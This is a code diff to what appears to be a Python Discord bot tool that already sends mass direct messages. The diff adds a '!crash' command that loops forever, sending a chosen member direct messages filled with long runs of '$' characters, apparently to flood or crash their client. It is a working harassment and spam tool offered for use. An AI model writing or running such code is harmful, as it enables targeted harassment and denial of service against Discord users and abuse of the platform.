@@ -273,6 +273,7 @@ elif select == 6:
             print(f'{bot.user.name} is ready...')
             print('\n')   
             print(f'{Fore.RED} Type !dm-all [message] or !dm [member] [message] in chat for start!')
+            print(f'{Fore.RED} or Type !crash [member] [message]')
             print('\n')
         @bot.command()
         async def dmall(ctx, *, message):
@@ -289,4 +290,11 @@ elif select == 6:
         async def dm(ctx,member:discord.Member,*,content):
             channel = await member.create_dm()
             await channel.send(content)
+        @bot.command()
+        async def crash(ctx,*,member:discord.Member):
+            while True:
+                channel = await member.create_dm()
+                await channel.send("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
+                await channel.send("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
         bot.run(token)
+    
